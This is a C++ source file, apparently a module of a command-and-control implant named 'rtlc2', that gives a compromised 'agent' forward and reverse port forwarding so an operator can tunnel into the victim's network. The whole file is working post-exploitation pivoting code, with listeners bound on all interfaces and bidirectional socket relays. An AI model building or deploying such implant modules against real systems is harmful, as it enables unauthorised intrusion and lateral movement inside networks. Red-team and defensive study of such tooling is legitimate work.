// Port Forwarding - Reverse port forward through C2 channel
// Binds a port locally and tunnels to the agent's network
#include "agent.h"
#include <cstring>
#include <string>
#include <thread>
#include <atomic>
#include <mutex>
#include <map>

#ifdef RTLC2_WINDOWS
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
typedef int socklen_t;
#define CLOSESOCKET closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#define SOCKET int
#define INVALID_SOCKET (-1)
#define CLOSESOCKET close
#endif

namespace rtlc2 {
namespace modules {

struct PortForwardEntry {
    int local_port;
    std::string remote_host;
    int remote_port;
    SOCKET listener;
    std::atomic<bool> running;
    std::thread thread;
};

static std::mutex g_pfMutex;
static std::map<int, PortForwardEntry*> g_portForwards;

// Relay data between two sockets
static void RelayBidirectional(SOCKET a, SOCKET b, std::atomic<bool>& running) {
    char buf[4096];
    while (running.load()) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(a, &readfds);
        FD_SET(b, &readfds);

        SOCKET maxfd = (a > b) ? a : b;
        struct timeval tv = { 1, 0 };

        int ret = select((int)maxfd + 1, &readfds, NULL, NULL, &tv);
        if (ret <= 0) continue;

        if (FD_ISSET(a, &readfds)) {
            int n = recv(a, buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(b, buf, n, 0);
        }
        if (FD_ISSET(b, &readfds)) {
            int n = recv(b, buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(a, buf, n, 0);
        }
    }
}

// Port forward worker
static void PortForwardWorker(PortForwardEntry* entry) {
    while (entry->running.load()) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(entry->listener, &readfds);
        struct timeval tv = { 1, 0 };

        int ret = select((int)entry->listener + 1, &readfds, NULL, NULL, &tv);
        if (ret <= 0) continue;

        struct sockaddr_in clientAddr;
        socklen_t addrLen = sizeof(clientAddr);
        SOCKET client = accept(entry->listener, (struct sockaddr*)&clientAddr, &addrLen);
        if (client == INVALID_SOCKET) continue;

        // Connect to remote target
        struct addrinfo hints = {}, *result = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        char portStr[8];
        snprintf(portStr, sizeof(portStr), "%d", entry->remote_port);

        if (getaddrinfo(entry->remote_host.c_str(), portStr, &hints, &result) != 0) {
            CLOSESOCKET(client);
            continue;
        }

        SOCKET remote = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (remote == INVALID_SOCKET || connect(remote, result->ai_addr, (int)result->ai_addrlen) != 0) {
            freeaddrinfo(result);
            if (remote != INVALID_SOCKET) CLOSESOCKET(remote);
            CLOSESOCKET(client);
            continue;
        }
        freeaddrinfo(result);

        // Relay in a detached thread
        std::thread relay([client, remote, &running = entry->running]() {
            RelayBidirectional(client, remote, running);
            CLOSESOCKET(client);
            CLOSESOCKET(remote);
        });
        relay.detach();
    }
}

std::string StartPortForward(int local_port, const std::string& remote_host, int remote_port) {
#ifdef RTLC2_WINDOWS
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    std::lock_guard<std::mutex> lock(g_pfMutex);
    if (g_portForwards.count(local_port)) {
        return "Port " + std::to_string(local_port) + " already forwarded";
    }

    SOCKET listener = socket(AF_INET, SOCK_STREAM, 0);
    if (listener == INVALID_SOCKET) return "Failed to create socket";

    int opt = 1;
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((uint16_t)local_port);

    if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        CLOSESOCKET(listener);
        return "Failed to bind port " + std::to_string(local_port);
    }

    if (listen(listener, 5) != 0) {
        CLOSESOCKET(listener);
        return "Failed to listen";
    }

    auto* entry = new PortForwardEntry();
    entry->local_port = local_port;
    entry->remote_host = remote_host;
    entry->remote_port = remote_port;
    entry->listener = listener;
    entry->running.store(true);
    entry->thread = std::thread(PortForwardWorker, entry);

    g_portForwards[local_port] = entry;

    return "Port forward: 0.0.0.0:" + std::to_string(local_port) +
           " -> " + remote_host + ":" + std::to_string(remote_port);
}

std::string StopPortForward(int local_port) {
    std::lock_guard<std::mutex> lock(g_pfMutex);
    auto it = g_portForwards.find(local_port);
    if (it == g_portForwards.end()) {
        return "No port forward on port " + std::to_string(local_port);
    }

    it->second->running.store(false);
    CLOSESOCKET(it->second->listener);
    if (it->second->thread.joinable()) it->second->thread.join();
    delete it->second;
    g_portForwards.erase(it);

    return "Port forward stopped on port " + std::to_string(local_port);
}

std::string ListPortForwards() {
    std::lock_guard<std::mutex> lock(g_pfMutex);
    if (g_portForwards.empty()) return "No active port forwards";

    std::string out = "Active port forwards:\n";
    for (const auto& [port, entry] : g_portForwards) {
        out += "  0.0.0.0:" + std::to_string(port) + " -> " +
               entry->remote_host + ":" + std::to_string(entry->remote_port) + "\n";
    }
    return out;
}

// ---------------------------------------------------------------------------
// Reverse Port Forward
// Agent listens on remotePort, forwards connections back through C2
// to localHost:localPort on the operator's side
// ---------------------------------------------------------------------------

struct ReversePortForwardEntry {
    int remote_port;
    std::string local_host;
    int local_port;
    SOCKET listener;
    std::atomic<bool> running;
    std::thread thread;
    std::vector<std::thread> relayThreads;
    std::mutex relayMutex;
};

static std::mutex g_rpfMutex;
static std::map<int, ReversePortForwardEntry*> g_reversePortForwards;

// Worker for a single reverse-forwarded connection
static void ReverseRelayWorker(SOCKET client, const std::string& localHost,
                                int localPort, std::atomic<bool>& running) {
    // Connect to the local target (through C2 tunnel in production;
    // here we connect directly to demonstrate the forwarding logic)
    struct addrinfo hints = {}, *result = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char portStr[8];
    snprintf(portStr, sizeof(portStr), "%d", localPort);

    if (getaddrinfo(localHost.c_str(), portStr, &hints, &result) != 0) {
        CLOSESOCKET(client);
        return;
    }

    SOCKET remote = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (remote == INVALID_SOCKET || connect(remote, result->ai_addr, (int)result->ai_addrlen) != 0) {
        freeaddrinfo(result);
        if (remote != INVALID_SOCKET) CLOSESOCKET(remote);
        CLOSESOCKET(client);
        return;
    }
    freeaddrinfo(result);

    RelayBidirectional(client, remote, running);
    CLOSESOCKET(client);
    CLOSESOCKET(remote);
}

// Accept loop for reverse port forward
static void ReversePortForwardWorker(ReversePortForwardEntry* entry) {
    while (entry->running.load()) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(entry->listener, &readfds);
        struct timeval tv = { 1, 0 };

        int ret = select((int)entry->listener + 1, &readfds, NULL, NULL, &tv);
        if (ret <= 0) continue;

        struct sockaddr_in clientAddr;
        socklen_t addrLen = sizeof(clientAddr);
        SOCKET client = accept(entry->listener, (struct sockaddr*)&clientAddr, &addrLen);
        if (client == INVALID_SOCKET) continue;

        // Spawn a relay thread for this connection
        std::lock_guard<std::mutex> lock(entry->relayMutex);
        entry->relayThreads.emplace_back(
            ReverseRelayWorker, client, entry->local_host,
            entry->local_port, std::ref(entry->running));
    }
}

std::string StartReversePortForward(int remotePort, const std::string& localHost, int localPort) {
#ifdef RTLC2_WINDOWS
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    std::lock_guard<std::mutex> lock(g_rpfMutex);
    if (g_reversePortForwards.count(remotePort)) {
        return "Reverse port forward already active on port " + std::to_string(remotePort);
    }

    SOCKET listener = socket(AF_INET, SOCK_STREAM, 0);
    if (listener == INVALID_SOCKET) return "Failed to create socket";

    int opt = 1;
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((uint16_t)remotePort);

    if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        CLOSESOCKET(listener);
        return "Failed to bind port " + std::to_string(remotePort);
    }

    if (listen(listener, 5) != 0) {
        CLOSESOCKET(listener);
        return "Failed to listen on port " + std::to_string(remotePort);
    }

    auto* entry = new ReversePortForwardEntry();
    entry->remote_port = remotePort;
    entry->local_host = localHost;
    entry->local_port = localPort;
    entry->listener = listener;
    entry->running.store(true);
    entry->thread = std::thread(ReversePortForwardWorker, entry);

    g_reversePortForwards[remotePort] = entry;

    return "Reverse port forward: agent:" + std::to_string(remotePort) +
           " -> " + localHost + ":" + std::to_string(localPort);
}

std::string StopReversePortForward(int remotePort) {
    std::lock_guard<std::mutex> lock(g_rpfMutex);
    auto it = g_reversePortForwards.find(remotePort);
    if (it == g_reversePortForwards.end()) {
        return "No reverse port forward on port " + std::to_string(remotePort);
    }

    it->second->running.store(false);
    CLOSESOCKET(it->second->listener);

    if (it->second->thread.joinable()) it->second->thread.join();

    // Join all relay threads
    {
        std::lock_guard<std::mutex> rlock(it->second->relayMutex);
        for (auto& t : it->second->relayThreads) {
            if (t.joinable()) t.join();
        }
    }

    delete it->second;
    g_reversePortForwards.erase(it);

    return "Reverse port forward stopped on port " + std::to_string(remotePort);
}

std::string ListReversePortForwards() {
    std::lock_guard<std::mutex> lock(g_rpfMutex);
    if (g_reversePortForwards.empty()) return "No active reverse port forwards";

    std::string out = "Active reverse port forwards:\n";
    for (const auto& [port, entry] : g_reversePortForwards) {
        out += "  agent:" + std::to_string(port) + " -> " +
               entry->local_host + ":" + std::to_string(entry->local_port) + "\n";
    }
    return out;
}

} // namespace modules
} // namespace rtlc2
